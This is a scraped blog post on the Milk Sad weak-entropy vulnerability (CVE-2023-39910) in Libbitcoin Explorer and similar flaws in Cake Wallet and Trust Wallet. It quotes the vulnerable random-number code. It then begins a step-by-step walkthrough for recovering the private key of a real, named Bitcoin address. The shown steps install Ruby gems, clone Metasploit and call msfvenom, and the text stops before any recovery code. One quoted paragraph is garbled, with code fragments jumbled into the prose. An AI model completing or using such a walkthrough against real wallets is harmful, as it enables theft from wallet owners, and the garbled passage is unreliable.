
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/046-1024x.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3852"></figure></div>

---


* Tutorial: [https://dzen.ru/video/watch/65478a2f6d9f3f7ec9641804](https://dzen.ru/video/watch/65478a2f6d9f3f7ec9641804)
* Tutorial: https://cryptodeeptech.ru/milk-sad-vulnerability-in-libbitcoin-explorer


---

<p><a href="https://www.slowmist.com/" target="_blank" rel="noreferrer noopener">Slowmist</a>&nbsp;researchers&nbsp;conduct regular research into the&nbsp;<a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">security of the Bitcoin blockchain</a>&nbsp;.&nbsp;They disclosed a vulnerability in the&nbsp;<a href="https://github.com/libbitcoin/libbitcoin-system/blob/a1b777fc51d9c04e0c7a1dec5cc746b82a6afe64/src/crypto/pseudo_random.cpp#L66C12-L78" target="_blank" rel="noreferrer noopener">Libbitcoin Explorer 3.x</a>&nbsp;library , which allowed attackers to steal more&nbsp;<code>$ 900 000</code> from Bitcoin Wallets (&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/" target="_blank" rel="noreferrer noopener">BTC</a>&nbsp;) users.</p>



<p>According to analysts, this vulnerability may also affect users&nbsp;&nbsp;<code>Ethereum,&nbsp;Ripple,&nbsp;Dogecoin, Solana,&nbsp;Litecoin,&nbsp;Bitcoin Cash&nbsp;и&nbsp;Zcash,</code>who use it&nbsp;<code>Libbitcoin</code> to create accounts.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3698"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-1.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3699"></figure></div>


<h2 class="wp-block-heading">Researchers gave the code name for this vulnerability ”&nbsp;<a href="https://milksad.info/" target="_blank" rel="noreferrer noopener">Milk Sad</a>&nbsp;“</h2>



<pre class="wp-block-code"><code><em>Было предложено использовать первые два слова первого мнемонического секрета BIP39, сгенерированного <strong>bx</strong> нулевым временем </em></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-2-1.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3700"><figcaption class="wp-element-caption"><a href="https://milksad.info/disclosure.html#codename-milk-sad" target="_blank" rel="noreferrer noopener">https://milksad.info/disclosure.html#codename-milk-sad</a></figcaption></figure></div>


<p>Technical description</p>



<h2 class="wp-block-heading">Technical Description CVE-2023-39910</h2>



<blockquote class="wp-block-quote">
<p>The cryptocurrency wallet entropy filling mechanism used in&nbsp;<strong>Libbitcoin Explorer 3.0.0–3.6.0</strong>&nbsp;is weak, also known as the&nbsp;<strong>Milk Sad problem.&nbsp;</strong>&nbsp;Using&nbsp;<strong>the Mersenne Twister mt19937 PRNG</strong>&nbsp;limits the internal entropy to 32 bits regardless of settings.&nbsp;This allows remote attackers to recover any wallet private keys generated from the entropy results of&nbsp;<strong>“bxseed”</strong>&nbsp;and steal funds.&nbsp;(Affected users need to transfer funds to a new secure cryptocurrency wallet)</p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-3-1.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3707"></figure></div>


<h2 class="wp-block-heading">Weak entropy in Cake Wallet</h2>



<blockquote class="wp-block-quote">
<p>Cake Wallet<br><a href="https://github.com/cake-tech/cake_wallet/blob/b67bb0664f7268c31c24bd9fb9cbd438c691f5e3/lib/bitcoin/bitcoin_mnemonic.dart#L11-L2" target="_blank" rel="noreferrer noopener">used Dart’s insecure Random() function to generate wallet seeds</a>&nbsp;:</p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-4-1.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3711"></figure></div>


<pre class="wp-block-code"><code>Uint8List randomBytes(int length, {bool secure = false}) {
  assert(length &gt; 0);
  final random = secure ? Random.secure() : Random();
  final ret = Uint8List(length);
  for (var i = 0; i &lt; length; i++) {
    ret[i] = random.nextInt(256);
  }
  return ret;
}</code></pre>



<blockquote class="wp-block-quote">
<p>This can be a real problem given that the function&nbsp;<code>Dart Random()</code><br><a href="https://github.com/dart-lang/sdk/blob/master/runtime/vm/random.cc#L17-L33" target="_blank" rel="noreferrer noopener">can revert to 0 or system time.</a></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-5.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3712"></figure></div>


<pre class="wp-block-code"><code>Random::Random() {
  uint64_t seed = FLAG_random_seed;
  if (seed == 0) {
    Dart_EntropySource callback = Dart::entropy_source_callback();
    if (callback != nullptr) {
      if (!callback(reinterpret_cast&lt;uint8_t*&gt;(&amp;seed), sizeof(seed))) {
        // Callback failed. Reset the seed to 0.
        seed = 0;
      }
    }
  }
  if (seed == 0) {
    // We did not get a seed so far. As a fallback we do use the current time.
    seed = OS::GetCurrentTimeMicros();
  }
  Initialize(seed);
}</code></pre>



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Funds from every wallet created using the Trust Wallet browser extension could be stolen without any user intervention.</h2>



<blockquote class="wp-block-quote">
<p></p>
</blockquote>



<p>Just recently, the&nbsp;<a href="https://donjon.ledger.com/" target="_blank" rel="noreferrer noopener">Donjon</a>&nbsp;security research team at&nbsp;<strong>Ledger</strong>&nbsp;discovered a critical vulnerability in this&nbsp;<strong>Trust Wallet</strong>&nbsp;browser extension , allowing an attacker to steal all assets of any wallet created using this extension without any user interaction.&nbsp;By knowing an account’s address, you can immediately determine its private key and then gain access to all of its funds.&nbsp;Below are details about the vulnerability, how Ledger Donjon discovered it, its impact over time, an assessment of the affected assets, and how Trust Wallet responded to patch it.&nbsp;But let’s start with a reminder of the basics.</p>



<p>It is difficult to demonstrate that random numbers are correct, and a poor but not fatally flawed random number generator can easily fool an observer.&nbsp;For good randomness, we need a uniform distribution of bits and bytes (and even all chunk sizes) and unpredictability.&nbsp;It should be impossible for the sequence observer to have any information about the next part of the generated sequence.</p>



<p>Because achieving these properties is incredibly difficult, the cryptocurrency space tries to avoid relying on randomness as much as possible, but at one stage we will still need it: when we create a new wallet.</p>



<p>You’re probably already familiar with your mnemonic – 12 to 24 English words that allow you to back up your wallet (if not, you can read the&nbsp;&nbsp;<a href="https://www.ledger.com/academy/bip-39-the-low-key-guardian-of-your-crypto-freedom" target="_blank" rel="noreferrer noopener">Ledger Academy article on this very topic).</a></p>



<p>This mnemonic encodes 16 to 32 bytes of entropy according to the&nbsp;&nbsp;<a href="https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki" target="_blank" rel="noreferrer noopener">BIP 39 standard</a>&nbsp;&nbsp;. The quality of this entropy is critical as it will be the source code of all keys used by your wallet across all chains, following the deterministic inference process defined by the BIP&nbsp;&nbsp;<a href="https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki" target="_blank" rel="noreferrer noopener">32</a>&nbsp;&nbsp;and&nbsp;&nbsp;<a href="https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki" target="_blank" rel="noreferrer noopener">BIP 44</a>&nbsp;standards &nbsp;.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-6.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3717"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong>The vulnerable version<code>Trust Wallet</code></strong><br><code><strong>bx</strong></code>&nbsp;has the same basic, fatal flaw: generating wallet entropy from an inappropriate&nbsp;<code><strong>MT19937 Mersenne Twister</strong>.</code><br><strong>bx</strong>&nbsp;algorithm additionally uses some clock information to populate MT19937, but this is of little consequence for practical offline brute-force attacks carried out by remote attackers.This is still the same limited 32-bit key space that attackers can completely comb through.To the best of our knowledge, Trust Wallet only creates wallets based on the 12-word BIP39 mnemonic, which locks entropy requirements (and thus PRNG usage) to 128 bits.<br><code><strong>bx</strong></code>more is flexible and generates 128-bit, 192-bit, 256-bit output (and more).More options mean more room to search, but are wallets created the same<br><code><strong><em>bx seed -b 128</em></strong></code>as wallets created by&nbsp;<code>Trust Wallet</code>?As it turned out, no – due to the nuance in the use of PRNG.The algorithm&nbsp;<code>MT19937 Mersenne Twister</code>used by&nbsp;<code>Trust Wallet</code>bx<br><strong>is</strong>&nbsp;the same, but the output is used slightly differently.When filling an entropy array with data, uses a single&nbsp;32-bit&nbsp;<strong><code>PRNG Trust Wallet</code></strong>output , takes the low-order 8 bits of that output to fill the array, and throws out the remaining 24 bits via bit-and-to&nbsp;<a href="https://github.com/trustwallet/wallet-core/blob/69b2da9826dfdeb8116be1e5a3747b3e9418592d/wasm/src/Random.cpp#L21">/Random.cpp</a>&nbsp;:<code>MT19937</code><code>Wasm/<br>&amp; 0x000000ff src</code><br><a href="https://github.com/trustwallet/wallet-core/blob/69b2da9826dfdeb8116be1e5a3747b3e9418592d/wasm/src/Random.cpp#L21"></a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-7-1.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3718"><figcaption class="wp-element-caption"><a href="https://milksad.info/disclosure.html#not-even-the-second-hack-mersenne-twister-use-in-trust-wallet" target="_blank" rel="noreferrer noopener">https://milksad.info/disclosure.html#not-even-the-second-hack-mersenne-twister-use-in-trust-wallet</a></figcaption></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-8.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3722"></figure></div>


<pre class="wp-block-code"><code>// Copyright © 2017-2022 Trust Wallet.
//

[...]

void random_buffer(uint8_t* buf, size_t len) {
    std::mt19937 rng(std::random_device{}());
    std::generate_n(buf, len, [&amp;rng]() -&gt; uint8_t { return rng() &amp; 0x000000ff; });
    return;
}</code></pre>



<p>Full detailed documentation of the theoretical part can be studied in the blog:&nbsp;<strong><a href="https://blog.ledger.com/Funds-of-every-wallet-created-with-the-Trust-Wallet-browser-extension-could-have-been-stolen/" target="_blank" rel="noreferrer noopener">Ledger Donjon</a></strong>&nbsp;, as well as in the documentation:&nbsp;<strong><a href="https://milksad.info/disclosure.html#not-even-the-second-hack-mersenne-twister-use-in-trust-wallet" target="_blank" rel="noreferrer noopener">Milk Sad</a></strong></p>



<h2 class="wp-block-heading"><a href="https://colab.research.google.com/drive/1OhspSm7GBGiqv3WfhAqU5SJ_BgXIbUh3" target="_blank" rel="noreferrer noopener">Let’s move on to the practical part:</a></h2>



<p>(You can open the finished file from&nbsp;<strong><a href="https://colab.research.google.com/drive/1OhspSm7GBGiqv3WfhAqU5SJ_BgXIbUh3" target="_blank" rel="noreferrer noopener">Jupyter Notebook&nbsp;</a></strong>and upload it to&nbsp;<strong><a href="https://colab.research.google.com/drive/1OhspSm7GBGiqv3WfhAqU5SJ_BgXIbUh3" target="_blank" rel="noreferrer noopener">Google Colab</a></strong>&nbsp;notebook )</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://colab.research.google.com/drive/1OhspSm7GBGiqv3WfhAqU5SJ_BgXIbUh3">https://colab.research.google.com/drive/1OhspSm7GBGiqv3WfhAqU5SJ_BgXIbUh3</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-29-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3896"><figcaption class="wp-element-caption"><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/25MilkSadVulnerability" target="_blank" rel="noreferrer noopener">https://github.com/demining/CryptoDeepTools/tree/main/25MilkSadVulnerability</a></strong></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s look at real examples of extracting the private key of a Bitcoin Wallet using a vulnerability in the&nbsp;<a href="https://github.com/libbitcoin/libbitcoin-system/blob/a1b777fc51d9c04e0c7a1dec5cc746b82a6afe64/src/crypto/pseudo_random.cpp#L66C12-L78" target="_blank" rel="noreferrer noopener">Libbitcoin Explorer 3.x</a>&nbsp;library .</p>



<h2 class="wp-block-heading"></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p class="has-background" style="background-color:#f78da812"><strong>First Bitcoin Wallet</strong>&nbsp;: In September&nbsp;<code>2023</code>there was a theft in the amount of:&nbsp;<strong><code>40886.76</code>US dollars // BITCOIN:<code>1.17536256 BTC</code></strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-9.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3724"><figcaption class="wp-element-caption"><a href="https://btc1.trezor.io/address/12iBrqVPpQ2oNeDgJu1F8RtoH1TsD1brU2" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/address/12iBrqVPpQ2oNeDgJu1F8RtoH1TsD1brU2</a></figcaption></figure></div>


<p><code>Vulnerability_in_Libbitcoin_Explorer_3_x_library.ipynb</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p class="has-background" style="background-color:#f78da812"><a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">Let’s open the Google Colab</a>&nbsp;service&nbsp;using the link:&nbsp;<a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">https://colab.research.google.com</a></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-11.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3735"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p class="has-background" style="background-color:#f78da812">Click on&nbsp;<strong><code>"+"</code></strong>and&nbsp;<em><strong>“Create a new notepad”</strong></em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-12.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3738"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Install Ruby in Google Colab</h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-13-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3740"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p class="has-background" style="background-color:#f78da812">To run the programs we need, we will install the object-oriented programming language&nbsp;<a href="https://www.ruby-lang.org/" target="_blank" rel="noreferrer noopener"><strong>Ruby</strong></a></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>!sudo apt install ruby-full</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-14-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3743"></figure></div>


<blockquote class="wp-block-quote">
<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">Let’s check the installation version</p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>!ruby --version</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-15.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3747"><figcaption class="wp-element-caption">Ruby version 3.0.2p107 (2021-07-07 revision 0db68f0233) [x86_64-linux-gnu]</figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p class="has-background" style="background-color:#f78da812">Let’s install a library&nbsp;<code>'bitcoin-ruby'</code>for interacting with the Bitcoin protocol/network</p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>!gem install bitcoin-ruby</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-16-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3749"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p class="has-background" style="background-color:#f78da812">Let’s install a library&nbsp;<code>'ecdsa'</code>for implementing the Elliptic Curve Digital Signature Algorithm (ECDSA)</p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>!gem install ecdsa</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-18.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3752"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p class="has-background" style="background-color:#f78da812">Let’s install a library&nbsp;<code>'base58'</code>to convert integer or binary numbers to&nbsp;<code>base58</code>and from.</p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>!gem install base58</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-19.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3754"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p class="has-background" style="background-color:#f78da812">Let’s install a library&nbsp;<code>'crypto'</code>to simplify operations with bytes and basic cryptographic operations</p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>!gem install crypto</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-20.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3755"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p class="has-background" style="background-color:#f78da812">Let’s install a library&nbsp;<code>'config-hash'</code>to simplify working with big data.</p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>!gem install config-hash -v 0.9.0</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-21.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3757"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Let’s install the Metasploit Framework and use MSFVenom</h2>



<blockquote class="wp-block-quote">
<p class="has-background" style="background-color:#f78da812">Let’s install&nbsp;<a href="https://www.metasploit.com/" target="_blank" rel="noreferrer noopener">the Metasploit Framework</a>&nbsp;from&nbsp;<a href="https://github.com/rapid7/metasploit-framework.git" target="_blank" rel="noreferrer noopener">GitHub</a>&nbsp;and use the&nbsp;<a href="https://github.com/rapid7/metasploit-framework/blob/master/msfvenom" target="_blank" rel="noreferrer noopener">MSFVenom</a>&nbsp;tool to create the payload.</p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-22-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3759"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>!git clone https://github.com/rapid7/metasploit-framework.git
</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>ls</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>cd metasploit-framework/</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-23-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3760"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p class="has-background" style="background-color:#f78da812">Let’s see the contents of the folder<code>"<strong><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noreferrer noopener">metasploit-framework</a></strong>"</code></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>ls</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-24.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3761"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Options:</h2>



<pre class="wp-block-code"><code>!./msfvenom -help </code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-25-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3765"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Let’s open the discovered vulnerability CVE-2023-39910</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39910" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-26-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3767"></a><figcaption class="wp-element-caption">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39910</figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p>In the note we see a link to the file:&nbsp;<a href="https://github.com/libbitcoin/libbitcoin-system/blob/a1b777fc51d9c04e0c7a1dec5cc746b82a6afe64/src/crypto/pseudo_random.cpp#L66C12-L78" target="_blank" rel="noreferrer noopener">pseudo_random.cpp</a></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Let’s open the code:</h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-27-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3769"><figcaption class="wp-element-caption">https://github.com/libbitcoin/libbitcoin-system/blob/a1b777fc51d9c04e0c7a1dec5cc746b82a6afe64/src/crypto/pseudo_random.cpp#L66C12-L78</figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><a href="https://github.com/libbitcoin/libbitcoin-system">libbitcoin-system</a>&nbsp;Bitcoin Cross-Platform C++ Development Toolkit</h2>


<div class="wp-block-image">
